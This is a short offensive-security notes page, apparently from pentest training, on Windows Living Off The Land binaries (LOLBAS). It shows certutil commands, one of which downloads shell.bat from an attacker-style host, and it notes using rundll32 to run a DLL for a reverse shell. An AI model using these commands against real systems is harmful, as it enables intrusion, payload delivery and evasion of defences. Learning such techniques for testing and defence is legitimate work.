# Miscellaneous Techniques

***

### <mark style="color:red;">Living Off The Land Binaries and Scripts (LOLBAS)</mark>

The [LOLBAS project](https://lolbas-project.github.io/)&#x20;

> Le projet **LOLBAS** (Living Off The Land Binaries And Scripts) documente des **binaires**, **scripts** et **bibliothèques** pouvant être utilisés pour des techniques de **Living Off The Land** sur des systèmes Windows.

<table data-full-width="true"><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>Code execution</td><td>Code compilation</td><td>File transfers</td></tr><tr><td>Persistence</td><td>UAC bypass</td><td>Credential theft</td></tr><tr><td>Dumping process memory</td><td>Keylogging</td><td>Evasion</td></tr><tr><td>DLL hijacking</td><td></td><td></td></tr></tbody></table>

<mark style="color:green;">**Transferring File with Certutil**</mark>

```powershell-session
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

<mark style="color:green;">**Encoding File with Certutil**</mark>

```cmd-session
certutil -encode file1 encodedfile
```

<mark style="color:green;">**Decoding File with Certutil**</mark>

```cmd-session
certutil -decode encodedfile file2
```

A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file.&#x20;

We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

***
